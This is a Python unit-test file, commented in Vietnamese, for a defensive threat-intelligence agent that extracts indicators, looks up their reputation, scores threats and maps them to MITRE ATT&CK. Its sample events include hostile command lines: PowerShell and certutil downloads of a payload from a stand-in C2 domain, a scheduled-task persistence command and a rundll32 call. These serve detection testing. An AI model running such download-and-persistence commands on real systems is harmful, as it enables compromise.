# -*- coding: utf-8 -*-
"""
tests/test_threat_intel_agent.py
Bộ Unit Tests toàn diện cho Threat Intelligence (CTI) Agent và ThreatIntelTools (Track 1 - Nam).
Kiểm tra:
1. Trích xuất đa dạng IoC (IP, Domain, URL, Hash) và lọc bỏ Private IP RFC 1918.
2. Bộ lọc Private IP RFC 1918 (10.x, 172.16-31.x, 192.168.x, 127.0.0.1, ::1).
3. Tra cứu uy tín đa nguồn (IP, Domain, URL, Hash) kèm cơ chế in-memory caching.
4. Tra cứu song song (Parallelism) sử dụng ThreadPoolExecutor.
5. Tính toán Threat Score tổng hợp và phân loại độc hại (is_malicious).
6. Ánh xạ kỹ thuật MITRE ATT&CK từ hành vi và dấu hiệu CTI.
7. Làm giàu IncidentState và sinh ThreatIntelEnrichment chuẩn Pydantic schema.
"""

import unittest
from datetime import datetime, timezone
from typing import List

from src.core.schemas import (
    ParsedEvent,
    IoCItem,
    ThreatIntelEnrichment,
    IncidentStatus
)
from src.core.state import IncidentState
from src.tools.threat_intel import ThreatIntelTools
from src.agents.threat_intel_agent import ThreatIntelAgent


class TestThreatIntelAgent(unittest.TestCase):

    def setUp(self):
        """Khởi tạo agent và làm sạch cache trước mỗi test case."""
        ThreatIntelTools.clear_cache()
        self.agent = ThreatIntelAgent(max_workers=4)

    # =====================================================================
    # 1. KIỂM THỬ BỘ LỌC PRIVATE IP (RFC 1918 & LOOPBACK)
    # =====================================================================
    def test_private_ip_filter_rules(self):
        """Kiểm tra nhận diện chính xác các dải IP nội bộ RFC 1918 và Public IP."""
        # Dải 10.0.0.0/8
        self.assertTrue(ThreatIntelTools.is_private_ip("10.0.0.1"))
        self.assertTrue(ThreatIntelTools.is_private_ip("10.255.255.254"))

        # Dải 172.16.0.0/12
        self.assertTrue(ThreatIntelTools.is_private_ip("172.16.0.5"))
        self.assertTrue(ThreatIntelTools.is_private_ip("172.31.255.254"))
        self.assertFalse(ThreatIntelTools.is_private_ip("172.32.0.1"))  # Ngoài dải RFC 1918

        # Dải 192.168.0.0/16
        self.assertTrue(ThreatIntelTools.is_private_ip("192.168.1.1"))
        self.assertTrue(ThreatIntelTools.is_private_ip("192.168.100.254"))

        # Loopback & Link-local
        self.assertTrue(ThreatIntelTools.is_private_ip("127.0.0.1"))
        self.assertTrue(ThreatIntelTools.is_private_ip("127.0.1.1"))
        self.assertTrue(ThreatIntelTools.is_private_ip("169.254.1.1"))
        self.assertTrue(ThreatIntelTools.is_private_ip("::1"))

        # IP có kèm cổng (e.g. 192.168.1.1:8080)
        self.assertTrue(ThreatIntelTools.is_private_ip("192.168.1.50:443"))

        # Public IPs (không được coi là private)
        self.assertFalse(ThreatIntelTools.is_private_ip("194.26.29.112"))
        self.assertFalse(ThreatIntelTools.is_private_ip("8.8.8.8"))
        self.assertFalse(ThreatIntelTools.is_private_ip("185.220.101.5"))
        self.assertFalse(ThreatIntelTools.is_private_ip("45.33.32.156"))

        # Chuỗi không hợp lệ
        self.assertFalse(ThreatIntelTools.is_private_ip(""))
        self.assertFalse(ThreatIntelTools.is_private_ip("not-an-ip"))

    def test_lookup_ip_private_skips_external(self):
        """Kiểm tra hàm lookup_ip tự động bỏ qua tra cứu CTI ngoài đối với Private IP."""
        res = ThreatIntelTools.lookup_ip("192.168.1.100")
        self.assertFalse(res.is_malicious)
        self.assertEqual(res.reputation_score, 0)
        self.assertEqual(res.ioc_type, "IP")
        self.assertEqual(res.value, "192.168.1.100")
        self.assertTrue(res.details.get("is_private"))
        self.assertEqual(res.details.get("status"), "private_ip_rfc1918")

    # =====================================================================
    # 2. KIỂM THỬ TRÍCH XUẤT VÀ LỌC TRÙNG LẶP IOC (IOC EXTRACTION)
    # =====================================================================
    def test_extract_iocs_from_events(self):
        """Kiểm tra trích xuất đầy đủ IP, Domain, URL, Hash và lọc bỏ IP Private."""
        events = [
            ParsedEvent(
                event_id="EVT-01",
                timestamp=datetime.now(timezone.utc),
                source_type="Sysmon",
                source_ip="192.168.1.50",  # Private -> bị lọc bỏ
                dest_ip="194.26.29.112",   # Public C2 -> giữ lại
                command_line=(
                    "powershell.exe -enc SQBFAFgA "
                    "Invoke-WebRequest -Uri http://evil-malware-c2.com/payload.exe -OutFile C:\\Windows\\Temp\\payload.exe"
                ),
                file_hash="MD5=e1112136104dd25e1f30d37f202f6f51,SHA256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
            ),
            ParsedEvent(
                event_id="EVT-02",
                timestamp=datetime.now(timezone.utc),
                source_type="Zeek",
                source_ip="10.0.0.12",     # Private -> bị lọc bỏ
                dest_ip="185.220.101.5",   # Public Phishing -> giữ lại
                raw_attributes={
                    "dns_query": "phishing-bank-login.xyz",
                    "http_uri": "https://phishing-bank-login.xyz/login.php"
                }
            ),
            ParsedEvent(
                event_id="EVT-03",
                timestamp=datetime.now(timezone.utc),
                source_type="Sysmon",
                source_ip="127.0.0.1",     # Loopback -> bị lọc bỏ
                dest_ip="194.26.29.112",   # Trùng lặp IP với EVT-01 -> deduplication
                command_line="certutil.exe -urlcache -split -f http://evil-malware-c2.com/payload.exe",
                file_hash="e1112136104dd25e1f30d37f202f6f51"  # Trùng MD5 với EVT-01
            )
        ]

        extracted = self.agent.extract_iocs(events)

        # Kiểm tra IP: chỉ giữ lại 2 public IPs, không có IP private
        self.assertIn("194.26.29.112", extracted["ips"])
        self.assertIn("185.220.101.5", extracted["ips"])
        self.assertNotIn("192.168.1.50", extracted["ips"])
        self.assertNotIn("10.0.0.12", extracted["ips"])
        self.assertNotIn("127.0.0.1", extracted["ips"])
        self.assertEqual(len(extracted["ips"]), 2)

        # Kiểm tra Domains: trích xuất được domain từ url và raw_attributes
        self.assertIn("evil-malware-c2.com", extracted["domains"])
        self.assertIn("phishing-bank-login.xyz", extracted["domains"])

        # Kiểm tra URLs
        self.assertIn("http://evil-malware-c2.com/payload.exe", extracted["urls"])
        self.assertIn("https://phishing-bank-login.xyz/login.php", extracted["urls"])

        # Kiểm tra Hashes
        self.assertIn("e1112136104dd25e1f30d37f202f6f51", extracted["hashes"])
        self.assertIn("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", extracted["hashes"])
        # Đảm bảo không trùng lặp MD5
        md5_count = extracted["hashes"].count("e1112136104dd25e1f30d37f202f6f51")
        self.assertEqual(md5_count, 1)

    # =====================================================================
    # 3. KIỂM THỬ TRA CỨU ĐA NGUỒN VÀ IN-MEMORY CACHE
    # =====================================================================
    def test_cti_tools_lookups_and_caching(self):
        """Kiểm tra tra cứu IP, Domain, URL, Hash và cơ chế in-memory cache."""
        # 1. Tra cứu IP độc hại
        res_ip = ThreatIntelTools.lookup_ip("194.26.29.112")
        self.assertTrue(res_ip.is_malicious)
        self.assertEqual(res_ip.reputation_score, 92)
        self.assertIn("Cobalt Strike", res_ip.threat_actor)

        # Kiểm tra cache đã lưu
        self.assertGreater(ThreatIntelTools.get_cache_size(), 0)
        cached_ip = ThreatIntelTools.lookup_ip("194.26.29.112")
        self.assertEqual(cached_ip.value, res_ip.value)

        # 2. Tra cứu IP sạch
        clean_ip = ThreatIntelTools.lookup_ip("8.8.8.8")
        self.assertFalse(clean_ip.is_malicious)
        self.assertEqual(clean_ip.reputation_score, 0)

        # 3. Tra cứu Domain độc hại và sạch
        bad_dom = ThreatIntelTools.lookup_domain("evil-malware-c2.com")
        self.assertTrue(bad_dom.is_malicious)
        self.assertEqual(bad_dom.reputation_score, 95)
        self.assertIn("APT29", bad_dom.threat_actor)

        clean_dom = ThreatIntelTools.lookup_domain("google.com")
        self.assertFalse(clean_dom.is_malicious)
        self.assertEqual(clean_dom.reputation_score, 0)

        # 4. Tra cứu URL độc hại
        bad_url = ThreatIntelTools.lookup_url("http://evil-malware-c2.com/payload.exe")
        self.assertTrue(bad_url.is_malicious)
        self.assertEqual(bad_url.reputation_score, 95)

        clean_url = ThreatIntelTools.lookup_url("https://www.google.com")
        self.assertFalse(clean_url.is_malicious)
        self.assertEqual(clean_url.reputation_score, 0)

        # 5. Tra cứu Hash (MD5, SHA256) độc hại và sạch
        # Mimikatz MD5
        mimi_hash = ThreatIntelTools.lookup_hash("e1112136104dd25e1f30d37f202f6f51")
        self.assertTrue(mimi_hash.is_malicious)
        self.assertEqual(mimi_hash.ioc_type, "MD5")
        self.assertEqual(mimi_hash.reputation_score, 98)
        self.assertIn("Mimikatz", mimi_hash.threat_actor)

        # WannaCry SHA256
        wc_hash = ThreatIntelTools.lookup_hash("ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa")
        self.assertTrue(wc_hash.is_malicious)
        self.assertEqual(wc_hash.ioc_type, "SHA256")
        self.assertEqual(wc_hash.reputation_score, 100)
        self.assertIn("Lazarus", wc_hash.threat_actor)

        # Clean Hash
        clean_hash = ThreatIntelTools.lookup_hash("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
        self.assertFalse(clean_hash.is_malicious)
        self.assertEqual(clean_hash.reputation_score, 0)

    # =====================================================================
    # 4. KIỂM THỬ TRA CỨU SONG SONG (PARALLELISM)
    # =====================================================================
    def test_lookup_iocs_parallel(self):
        """Kiểm tra tra cứu song song qua ThreadPoolExecutor và tính chính xác."""
        iocs = {
            "ips": ["194.26.29.112", "8.8.8.8", "45.33.32.156"],
            "domains": ["evil-malware-c2.com", "google.com", "c2-stealer-service.top"],
            "urls": ["http://evil-malware-c2.com/payload.exe", "https://github.com"],
            "hashes": [
                "e1112136104dd25e1f30d37f202f6f51",
                "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
            ]
        }
        total_count = sum(len(v) for v in iocs.values())

        results = self.agent.lookup_iocs_parallel(iocs)
        self.assertEqual(len(results), total_count)

        # Kiểm tra kết quả được sắp xếp: các IoC độc hại xếp trước
        malicious_results = [r for r in results if r.is_malicious]
        clean_results = [r for r in results if not r.is_malicious]

        self.assertGreater(len(malicious_results), 0)
        self.assertGreater(len(clean_results), 0)
        # Phần tử đầu tiên phải là độc hại với điểm số cao
        self.assertTrue(results[0].is_malicious)
        self.assertGreaterEqual(results[0].reputation_score or 0, 90)

    # =====================================================================
    # 5. KIỂM THỬ TÍNH THREAT SCORE & PHÂN LOẠI IS_MALICIOUS
    # =====================================================================
    def test_compute_threat_score(self):
        """Kiểm tra tính toán Threat Score và ngưỡng độc hại >= 50."""
        # Trường hợp 1: Danh sách IoC độc hại cao
        items_bad = [
            IoCItem(ioc_type="IP", value="1.2.3.4", reputation_score=92, is_malicious=True),
            IoCItem(ioc_type="DOMAIN", value="evil.com", reputation_score=95, is_malicious=True),
            IoCItem(ioc_type="HASH", value="abc", reputation_score=90, is_malicious=True)
        ]
        score_bad, is_mal = self.agent.compute_threat_score(items_bad)
        self.assertTrue(is_mal)
        self.assertGreaterEqual(score_bad, 95)  # Max (95) + bonus
        self.assertLessEqual(score_bad, 100)

        # Trường hợp 2: Danh sách IoC sạch
        items_clean = [
            IoCItem(ioc_type="IP", value="8.8.8.8", reputation_score=0, is_malicious=False),
            IoCItem(ioc_type="DOMAIN", value="google.com", reputation_score=10, is_malicious=False)
        ]
        score_clean, is_mal_clean = self.agent.compute_threat_score(items_clean)
        self.assertFalse(is_mal_clean)
        self.assertEqual(score_clean, 10)

        # Trường hợp 3: Danh sách rỗng
        score_empty, is_mal_empty = self.agent.compute_threat_score([])
        self.assertFalse(is_mal_empty)
        self.assertEqual(score_empty, 0)

        # Trường hợp 4: Ngưỡng ranh giới 50
        items_border_50 = [
            IoCItem(ioc_type="IP", value="1.2.3.4", reputation_score=50, is_malicious=True)
        ]
        score_50, is_mal_50 = self.agent.compute_threat_score(items_border_50)
        self.assertTrue(is_mal_50)
        self.assertEqual(score_50, 50)

        items_border_49 = [
            IoCItem(ioc_type="IP", value="1.2.3.4", reputation_score=49, is_malicious=False)
        ]
        score_49, is_mal_49 = self.agent.compute_threat_score(items_border_49)
        self.assertFalse(is_mal_49)
        self.assertEqual(score_49, 49)

    # =====================================================================
    # 6. KIỂM THỬ ÁNH XẠ KỸ THUẬT MITRE ATT&CK
    # =====================================================================
    def test_mitre_mapping(self):
        """Kiểm tra ánh xạ kỹ thuật MITRE ATT&CK từ hành vi và IoC CTI."""
        events = [
            ParsedEvent(
                event_id="EVT-POWERSHELL",
                timestamp=datetime.now(timezone.utc),
                source_type="Sysmon",
                process_name="powershell.exe",
                command_line="powershell.exe -enc SQBFAFgA"
            ),
            ParsedEvent(
                event_id="EVT-PERSIST",
                timestamp=datetime.now(timezone.utc),
                source_type="Sysmon",
                process_name="schtasks.exe",
                command_line="schtasks /create /tn 'Malware' /tr 'cmd.exe' /sc onlogon"
            ),
            ParsedEvent(
                event_id="EVT-WAZUH",
                timestamp=datetime.now(timezone.utc),
                source_type="Wazuh",
                raw_attributes={"mitre_ids": ["T1046", "T1018"]}
            )
        ]
        ioc_items = [
            IoCItem(
                ioc_type="IP",
                value="194.26.29.112",
                reputation_score=92,
                is_malicious=True,
                threat_actor="Cobalt Strike Team",
                details={"categories": ["C2", "Botnet"]}
            ),
            IoCItem(
                ioc_type="HASH",
                value="e1112136104dd25e1f30d37f202f6f51",
                reputation_score=98,
                is_malicious=True,
                threat_actor="Mimikatz",
                details={"categories": ["Credential Dumper"]}
            )
        ]

        techniques = self.agent.extract_mitre_techniques(events, ioc_items)

        # Kiểm tra các kỹ thuật từ tiến trình và sự kiện
        self.assertIn("T1059.001", techniques)  # PowerShell
        self.assertIn("T1053.005", techniques)  # Scheduled Task
        self.assertIn("T1046", techniques)      # Network Service Discovery (Wazuh)
        self.assertIn("T1018", techniques)      # Remote System Discovery (Wazuh)

        # Kiểm tra các kỹ thuật từ IoC CTI
        self.assertIn("T1071.001", techniques)  # C2 Web Protocols (Cobalt Strike)
        self.assertIn("T1003.001", techniques)  # LSASS Credential Dumping (Mimikatz)

    # =====================================================================
    # 7. KIỂM THỬ ENRICH_EVENTS & THREATINTELENRICHMENT SCHEMA
    # =====================================================================
    def test_enrich_events_complete_pipeline(self):
        """Kiểm tra toàn bộ pipeline enrich_events sinh ThreatIntelEnrichment chuẩn Pydantic."""
        events = [
            ParsedEvent(
                event_id="EVT-ATTACK-01",
                timestamp=datetime.now(timezone.utc),
                source_type="Sysmon",
                source_ip="192.168.1.10",
                dest_ip="194.26.29.112",
                process_name="powershell.exe",
                command_line="powershell.exe -w hidden -enc download http://evil-malware-c2.com/payload.exe",
                file_hash="e1112136104dd25e1f30d37f202f6f51"
            )
        ]

        enrichment: ThreatIntelEnrichment = self.agent.enrich_events(events)

        # Kiểm tra kiểu dữ liệu chuẩn Pydantic
        self.assertIsInstance(enrichment, ThreatIntelEnrichment)

        # Kiểm tra danh sách IoC
        self.assertGreaterEqual(len(enrichment.extracted_iocs), 3)  # IP, Domain, URL, Hash
        malicious_iocs = [i for i in enrichment.extracted_iocs if i.is_malicious]
        self.assertGreaterEqual(len(malicious_iocs), 2)

        # Kiểm tra Threat Actors
        self.assertTrue(len(enrichment.related_threat_actors) > 0)
        self.assertTrue(
            any("Cobalt Strike" in actor or "APT29" in actor or "Mimikatz" in actor
                for actor in enrichment.related_threat_actors)
        )

        # Kiểm tra MITRE Techniques
        self.assertIn("T1059.001", enrichment.mitre_techniques)
        self.assertIn("T1071.001", enrichment.mitre_techniques)

        # Kiểm tra Enrichment Summary
        self.assertIn("IoC độc hại đã xác nhận", enrichment.enrichment_summary)
        self.assertIn("Threat Score", enrichment.enrichment_summary)

    # =====================================================================
    # 8. KIỂM THỬ ENRICH_STATE & CẬP NHẬT INCIDENTSTATE
    # =====================================================================
    def test_enrich_state_integration(self):
        """Kiểm tra enrich_state tích hợp vào IncidentState và lưu vết lịch sử chuyển đổi."""
        state = IncidentState(
            incident_id="INC-TEST-001",
            status=IncidentStatus.INVESTIGATING,
            parsed_events=[
                ParsedEvent(
                    event_id="EVT-01",
                    timestamp=datetime.now(timezone.utc),
                    source_type="Sysmon",
                    source_ip="10.0.0.5",
                    dest_ip="45.33.32.156",  # Emotet C2
                    process_name="rundll32.exe",
                    command_line="rundll32.exe evil.dll,Run",
                    file_hash="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"  # RedLine
                )
            ]
        )

        initial_history_len = len(state.history)

        # Gọi hàm làm giàu trạng thái
        updated_state = self.agent.enrich_state(state)

        # 1. State phải chứa threat_intel
        self.assertIsNotNone(updated_state.threat_intel)
        self.assertIsInstance(updated_state.threat_intel, ThreatIntelEnrichment)
        self.assertGreater(len(updated_state.threat_intel.extracted_iocs), 0)

        # 2. StateTransition history phải được ghi nhận
        self.assertEqual(len(updated_state.history), initial_history_len + 1)
        latest_transition = updated_state.history[-1]
        self.assertEqual(latest_transition.node, "ThreatIntelAgent")
        self.assertIn("metadata", latest_transition.model_dump())
        self.assertTrue(latest_transition.metadata.get("is_malicious"))
        self.assertGreaterEqual(latest_transition.metadata.get("threat_score", 0), 90)

    # =====================================================================
    # 9. KIỂM THỬ SỰ KIỆN LÀNH TÍNH (BENIGN EVENTS)
    # =====================================================================
    def test_benign_events_enrichment(self):
        """Kiểm tra sự kiện lành tính cho ra Threat Score thấp và tóm tắt an toàn."""
        clean_events = [
            ParsedEvent(
                event_id="EVT-BENIGN-01",
                timestamp=datetime.now(timezone.utc),
                source_type="Zeek",
                source_ip="192.168.1.100",  # Private
                dest_ip="8.8.8.8",          # Clean Public DNS
                command_line="ping 8.8.8.8"
            )
        ]

        enrichment = self.agent.enrich_events(clean_events)
        self.assertFalse(any(ioc.is_malicious for ioc in enrichment.extracted_iocs))
        self.assertEqual(len(enrichment.related_threat_actors), 0)
        self.assertIn("An toàn/Sạch", enrichment.enrichment_summary)


if __name__ == "__main__":
    unittest.main()
